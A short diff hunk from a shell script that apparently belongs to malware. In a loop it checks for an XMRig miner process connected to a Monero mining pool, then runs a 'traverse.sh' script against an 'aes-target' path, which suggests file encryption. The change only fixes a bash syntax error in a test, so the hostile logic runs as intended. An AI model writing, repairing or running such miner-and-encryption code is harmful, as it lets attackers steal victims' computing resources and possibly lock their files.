@@ -26,7 +26,7 @@ while [ 1 ] ; do
     CheckProcess "./xmrig -o pool.minexmr.com:443"
     if [ $? == 0 ];then
         # restart & aes 
-        if [$num!=0]; then
+        if [ $num != 0 ];then
         chmod 764 traverse.sh
         ./traverse.sh ./aes-target 
         fi
